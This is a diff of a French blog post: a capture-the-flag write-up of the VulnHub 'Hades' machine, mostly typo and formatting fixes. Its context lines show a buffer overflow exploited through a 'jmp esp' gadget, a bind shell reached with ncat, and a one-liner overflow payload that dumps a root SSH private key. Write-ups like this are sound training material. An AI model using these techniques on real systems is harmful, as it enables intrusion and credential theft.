@@ -7,13 +7,13 @@ tags: [CTF,VulnHub,binary exploitation]
 Introduction
 ------------
 
-Voici le début d'un article qui devrait être long mais très intéressant.  
+Voici le début d'un article qui devrait être long, mais très intéressant.  
 
-Début avril, *VulnHub* a lancé [une compétition baptisée Hades](http://vulnhub.com/entry/the-infernal-hades,61/) qui consiste en une machine virtuelle de CTF créée par *Lok\_Sigma*.  
+Début avril, *VulnHub* a lancé [une compétition baptisée Hades](http://vulnhub.com/entry/the-infernal-hades,61/) qui consiste en une machine virtuelle de CTF créée par `Lok_Sigma`.  
 
 L'objectif : récupérer une clé GPG sur la machine (elle est chiffrée et il faudra pourvoir la déchiffrer).  
 
-Le challenge est présenté comme étant volontairement compliqué et la solution que vous trouverez çi-dessous devrait vous convainvre que c'était plutôt corsé :)  
+Le challenge est présenté comme étant volontairement compliqué et la solution que vous trouverez çi-dessous devrait vous convaincre que c'était plutôt corsé :)  
 
 Mise en place de la VM
 ----------------------
@@ -82,14 +82,14 @@ Le programme s'attend alors à ce que l'on tape deux commandes. Pour chacune il 
 
 Après la saisie de ces deux commandes, la connexion reste ouverte. On peut alors envoyer autant de données que l'on souhaite, cela ne changera rien.  
 
-Le programme est assez mystérieux car la notion de commande est très vague : commande bash, python, etc ?  
+Le programme est assez mystérieux, car la notion de commande est très vague : commande bash, python, etc ?  
 
 Après avoir tente de nombreux mots clés, on voit que ce n'est pas la solution.  
 
 Le programme n'est pas non plus vulnérable aux formats strings. En revanche on comprend vite que le programme effectue deux read() (ou recv()) à la suite pour obtenir les données car si on envoie trop de données à la première commande on a deux fois le message *"Got it"* qui apparaît.  
 
 Si l'on envoie encore plus de données, on remarque que le programme semble vulnérable à un buffer overflow. En effet, il ferme abruptement la connexion si on envoie 170 octets ou plus.
-Les possibilités d'exploitation semblent bien mince car quand le programme crashe il ne se relance pas, rendant toute sorte d'attaque par force-brute (sur une adresse de retour par exemple) impossible. Il faut alors redémarrer la machine virtuelle :(  
+Les possibilités d'exploitation paraissent bien mince, car quand le programme crashe il ne se relance pas, rendant toute sorte d'attaque par force-brute (sur une adresse de retour par exemple) impossible. Il faut alors redémarrer la machine virtuelle :(  
 
 De toute évidence, il y a une information importante ailleurs.  
 
@@ -117,7 +117,7 @@ dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
 BuildID[sha1]=d241bcc0f0d75412c3fe834dd345732b59075c50, not stripped
 ```
 
-Et si on fait un *strings*, qu'est-ce que l'on obtient ?  
+Et si on fait un `strings`, qu'est-ce que l'on obtient ?  
 
 ```
 /lib/ld-linux.so.2
@@ -156,7 +156,7 @@ C'est bien le binaire derrière le port 65535 et il n'est pas strippé !
 
 Jetons un coup d’œil avec *Radare2* :  
 
-```
+```nasm
 $ radare2 loki_server 
  -- Use 'e' and 't' in Visual mode to edit configuration and track flags
 [0x080485a0]> aa
@@ -240,7 +240,7 @@ On remarque aussi qu'il alloue 121 octets (0x79) sur le tas au tout début du pr
 
 Il saute ensuite sur cette partie de code :  
 
-```
+```nasm
 [0x080485a0]> pdf@0x80489b1
 / (fcn) fcn.08048855 384
 | .-------> 0x08048855    c7442404790. mov dword [esp+0x4], 0x79 ;  0x00000079 
@@ -352,7 +352,7 @@ Des recopie sont faites différemment en fonction de sa valeur mais après calcu
 
 Regardons plutôt la fonction *v2* qui est appelée pour la seconde commande :  
 
-```
+```nasm
 [0x080485a0]> pdf@sym.v2
 |          ; CODE (CALL) XREF from 0x080489a4 (fcn.08048855)
 / (fcn) sym.v2 38
@@ -424,9 +424,9 @@ gs             0x63     99
 
 Le registre eip a bien été écrasé par nos "C".  
 
-Maintenant il nous faut trouver une adresse de retour valide. On a déjà vu qu'un brute-force était impossible.  
+Maintenant, il nous faut trouver une adresse de retour valide. On a déjà vu qu'un brute-force était impossible.  
 
-Utiliser l'adresse qui a été réservée par *malloc()* au tout début du programme semblait être une possibilité intéressante mais supposait deux conditions :  
+Utiliser l'adresse qui a été réservée par *malloc()* au tout début du programme semblait être une possibilité intéressante, mais supposait deux conditions :  
 
 * le heap doit avoir le flag exécutable ce qui n'est probablement pas le cas
 * les adresses ne doivent pas être randomisées
@@ -437,7 +437,7 @@ Evidemment il faut relancer la VM à chaque tentative. Malheureusement... ça n'
 
 Voyons voir ce que ce programme a d'autre dans le ventre :  
 
-```
+```console
 $ nm loki_server
          U accept@@GLIBC_2.0
          U bind@@GLIBC_2.0
@@ -459,7 +459,7 @@ Intéressant ! En plus de la fonction vulnérable *v2*, le programme a des fonct
 
 Qu'il y a t-il dans *v0* ?  
 
-```
+```nasm
 [0x080485a0]> pdf@sym.v0
 / (fcn) sym.v0 13
 |          0x0804868c    55           push ebp
@@ -469,7 +469,7 @@ Qu'il y a t-il dans *v0* ?
 \          0x08048697    ffe4         jmp esp
 ```
 
-Et que trouve t'on dans esp-0x2c ? (merci gdb)  
+Et que trouve t'on dans `esp-0x2c` ? (merci gdb)  
 
 ```
 (gdb) x/s $esp-0x2c
@@ -478,9 +478,9 @@ Et que trouve t'on dans esp-0x2c ? (merci gdb)
 
 Bingo ! Le début de la seconde commande :)  
 
-L'exploitation se fera par conséquent via l'envoi d'une seconde commande commençant par un shellcode suivit par l'adresse de retour qui sera 0x08048694 qui appellera un morceau de *v0* pour sauter sur le début du shellcode :)  
+L'exploitation se fera par conséquent via l'envoi d'une seconde commande commençant par un shellcode suivit par l'adresse de retour qui sera `0x08048694` qui appellera un morceau de *v0* pour sauter sur le début du shellcode :)  
 
-Ca nous laisse donc 50 octets pour mettre notre shellcode + les nops... argh !  
+Ça nous laisse donc 50 octets pour mettre notre shellcode + les nops... argh !  
 
 Si on regarde [sur shell-storm](http://www.shell-storm.org/shellcode/), trouver un shellcode network-aware de cette taille est mission impossible.  
 
@@ -533,7 +533,7 @@ On envoie une première commande qui contiendra notre shellcode final ainsi que 
 
 On envoie une seconde commande qui commence par un petit shellcode qui saute vers la première commande et se continue par l'adresse de retour qui pointe sur *v0* qui saute vers le petit shellcode.  
 
-Au final j'ai écrit l'exploit suivant (notez le "A" qui est juste là pour aligner l'adresse qui était décalée) :  
+Au final, j'ai écrit l'exploit suivant (notez le "A" qui est juste là pour aligner l'adresse qui était décalée) :  
 
 ```python
 #!/usr/bin/python
@@ -582,7 +582,7 @@ print "done"
 
 On lance l'exploit et on se connecte au port 11111 :
 
-```
+```console
 $ ncat 192.168.1.53 11111 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.53:11111.
@@ -597,7 +597,7 @@ Stealing Hades key
 
 Une fois que l'on a récupéré un shell plus propre...  
 
-```
+```console
 loki@Hades:~$ ls -al
 total 40
 drwxr-xr-x 3 loki loki 4096 Mar 19 18:59 .
@@ -616,9 +616,9 @@ AES 256 CBC
 Good for you and good for me.
 ```
 
-Dans la racine du système de fichier on trouve différents fichiers intéressants notamment un exécutable set-uid root et une clé en lecture pour root uniquement :  
+Dans la racine du système de fichier, on trouve différents fichiers intéressants notamment un exécutable set-uid root et une clé en lecture pour root uniquement :  
 
-```
+```console
 loki@Hades:/$ ls -alR display_root_ssh_key/
 display_root_ssh_key/:
 total 280
@@ -630,13 +630,13 @@ loki@Hades:/$ ls -l key_file
 -r-------- 1 root root 9984 Mar 19 17:27 key_file
 ```
 
-Une fois lancé, le programme *display\_key* demande un mot de passe. Après 3 tentatives infructueuses le binaire redémarre le système !  
+Une fois lancé, le programme `display_key` demande un mot de passe. Après 3 tentatives infructueuses le binaire redémarre le système !  
 
-Le fichier *counter* est vraisemblablement présent pour tenir à jour le nombre de tentatives.  
+Le fichier `counter` est vraisemblablement présent pour tenir à jour le nombre de tentatives.  
 
 Ce programme semble aussi vulnérable à un buffer overflow et crashe si on rentre un mot de passe trop grand.  
 
-Si on passe strings sur *display\_key* on trouve :  
+Si on passe `strings` sur `display_key` on trouve :  
 
 ```
 CuX(
@@ -654,21 +654,21 @@ jdom
 mi^kv
 ```
 
-On voit une commande intéressante mais pas de *"reboot"*. Le programme serait-il chiffré ? Si on lance *gcore* sur le programme alors qu'il tourne on retrouve bien "reboot" dans le dump.  
+On voit une commande intéressante, mais pas de *"reboot"*. Le programme serait-il chiffré ? Si on lance `gcore` sur le programme alors qu'il tourne on retrouve bien "reboot" dans le dump.  
 
 Contrairement à d'autres challenges, placer un exécutable à nous baptisé *reboot* dans le PATH n'a aucun résultat :(  
 
-**EDIT :** il semble qu'en fait il était possible de simplement créer un binaire reboot... J'ai du faire une mauvaise manipulation... qu'importe, je vous offre une solution plus intéressante ;-)   
+**EDIT :** il semble qu'en fait il était possible de simplement créer un binaire reboot... J'ai dû faire une mauvaise manipulation... qu'importe, je vous offre une solution plus intéressante ;-)   
 
-L'analyse se révèle particulièrement difficile car le programme est compilé en static (il pèse 267 Ko) et est bien entendu strippé !  
+L'analyse se révèle particulièrement difficile, car le programme est compilé en static (il pèse 267 Ko) et est bien entendu strippé !  
 
 Qui plus est le programme a tendance à quitter trop tôt si on le lance depuis gdb. Il faut donc le lancer et s'attacher ensuite pour l'analyser dynamiquement.  
 
-Par où commencer l'analyse de ce programme quand on ne sait pas où se trouve le main() ? Il y a deux écoles...  
+Par où commencer l'analyse de ce programme quand on ne sait pas où se trouve le `main()` ? Il y a deux écoles...  
 
 **La méthode de l'école des "Petits Malins"** (celle que... je n'ai pas utilisé)  
 
-Quand le programme tourne, en root on affiche son fichier maps (cat cat /proc/pid\_du\_programme/maps) :  
+Quand le programme tourne, en root on affiche son fichier maps (`cat /proc/pid_du_programme/maps`) :  
 
 ```
 00c01000-00c02000 r-xp 00000000 08:02 614773                             /tmp/display_key
@@ -682,17 +682,17 @@ ffc3f000-ffc60000 rwxp 00000000 00:00 0                                  [stack]
 
 On voit une section qui est vraisemblablement celle du code (exécutable, lecture, suffisamment longue) en 0x08048000.  
 
-Ensuite depuis gdb on affiche les instructions (x/200i 0x08048000).  
+Ensuite depuis gdb on affiche les instructions (`x/200i 0x08048000`).  
 
-Dans tout ce fatras on trouve des instructions caractéristiques d'un appel à main() :  
+Dans tout ce fatras, on trouve des instructions caractéristiques d'un appel à `main()` :  
 
-```
+```nasm
    0x8048157:   push   $0x804837b
    0x804815c:   call   0x80483f0
    0x8048161:   hlt
 ```
 
-Bravo, l'adresse du main() est vraisemblablement 0x804837b, vous pouvez commencer votre analyse ici.  
+Bravo, l'adresse du `main()` est vraisemblablement `0x804837b`, vous pouvez commencer votre analyse ici.  
 
 **La méthode de l'école "Prise de tête mais on s'amuse quand même"** (celle que j'ai utilisé)  
 
@@ -700,11 +700,11 @@ Si on suit l'exécution du programme via *strace* on voit les appels systèmes u
 
 Mais ce serait mieux si on pouvait connaître les adresses depuis lesquels ils sont appelés (la suite de calls qui y mène).  
 
-Le programme est compilé en statique, c'est à dire que les méthodes de la libc sont présentes à l'intérieur.  
+Le programme est compilé en statique, c'est-à-dire que les méthodes de la libc sont présentes à l'intérieur.  
 
-Si le code appelle *printf()* à deux endroits différents alors la suite des call/ret jusqu'au syscall write sera la même et ne différera qu'au niveau du code de *display\_key*.  
+Si le code appelle `printf()` à deux endroits différents alors la suite des call/ret jusqu'au syscall write sera la même et ne différera qu'au niveau du code de `display_key`.  
 
-J'ai décidé d'écrire un débugger basé sur *ptrace()* qui m'affiche les adresses des instructions qui suivent les ret à partir du moment où un syscall spécifique est appelé. En gros les adresses juste après le call.  
+J'ai décidé d'écrire un débugger basé sur `ptrace()` qui m'affiche les adresses des instructions qui suivent les ret à partir du moment où un syscall spécifique est appelé. En gros les adresses juste après le call.  
 
 Le principal du code (la version plus complète [à télécharger ici](/assets/data/call_trace.c)) :  
 
@@ -815,7 +815,7 @@ Notez que ce code a été écrit pour du x86. Il est loin d'être parfait (peut 
 
 Les plus courageux pourront même coupler ce code avec [Capstone](http://www.capstone-engine.org/) pour avoir un programme top-la-classe qui affiche les instructions assembleur.  
 
-```
+```console
 $ ./call_trace display_key
 [*] mmap (90)
 [*] readlink (85)
@@ -875,7 +875,7 @@ Je n'entrerais pas dans les détails de déboguage du programme : ça s'est fait
 
 Au bout d'un moment on atterri ici :  
 
-```
+```nasm
    0x804832d:	push   %ebp
    0x804832e:	mov    %esp,%ebp
    0x8048330:	sub    $0x38,%esp
@@ -902,7 +902,7 @@ Au bout d'un moment on atterri ici :
 
 Le contenu de la première fonction appelée (pour les curieux) :  
 
-```
+```nasm
 => 0x8055450:	push   %ebp
    0x8055451:	xor    %edx,%edx
    0x8055453:	mov    %esp,%ebp
@@ -924,7 +924,7 @@ Le contenu de la première fonction appelée (pour les curieux) :
 
 La méthode qui gère le statut du compteur :  
 
-```
+```nasm
 => 0x8048268:	push   %ebp
    0x8048269:	mov    %esp,%ebp
    0x804826b:	sub    $0x28,%esp
@@ -980,11 +980,11 @@ La méthode qui gère le statut du compteur :
 
 On remarque dans l'algorithme que *reboot* est lancé si à la saisie du mot de passe counter valait 2.  
 
-La saisie de *"S3cr3t!"* n'apporte malheureusement pas grand chose :(  
+La saisie de *"S3cr3t!"* n'apporte malheureusement pas grand-chose :(  
 
-Si le précédent programme (*loki\_server*) avait encore des anciennes fonctions, celui ci n'est peut-être pas terminé...  
+Si le précédent programme (`loki_server`) avait encore des anciennes fonctions, celui-ci n'est peut-être pas terminé...  
 
-Dans tous les cas on voit cette fois la chaine "reboot" à l'adresse 0x80ab42c.  
+Dans tous les cas, on voit cette fois la chaine "reboot" à l'adresse 0x80ab42c.  
 
 Si on cherche les chaines autour de *reboot* :  
 
@@ -1002,7 +1002,7 @@ Si on cherche les chaines autour de *reboot* :
 0x80ab42c:      "reboot"
 ```
 
-On utilise une super fonctionnalité de gdb pour savoir si l'adresse de *"cat /root/.ssh/id\_rsa"* est utilisée dans le code :  
+On utilise une super fonctionnalité de gdb pour savoir si l'adresse de `cat /root/.ssh/id_rsa` est utilisée dans le code :  
 
 ```
 (gdb) find /b 0x8048000,  0x8048fff, 0x08, 0xb4, 0x0a, 0x08
@@ -1020,7 +1020,7 @@ On utilise une super fonctionnalité de gdb pour savoir si l'adresse de *"cat /r
 
 On peut exploiter le buffer overflow et mettant comme adresse de retour l'adresse du *movl* :  
 
-```
+```console
 $ python -c 'print "\x5a\x82\x04\x08"*30' | ./display_key
 
 -----BEGIN RSA PRIVATE KEY-----
@@ -1058,7 +1058,7 @@ Notez que les solutions alternatives d'exploitation sont réduites par le fait q
 
 Une connection SSH plus tard...  
 
-```
+```console
 root@Hades:~# openssl aes-256-cbc -d -in flag.txt.enc -out agadou.txt -pass file:/key_file
 root@Hades:~# cat agadou.txt 
 Congratulations on completing Hades.
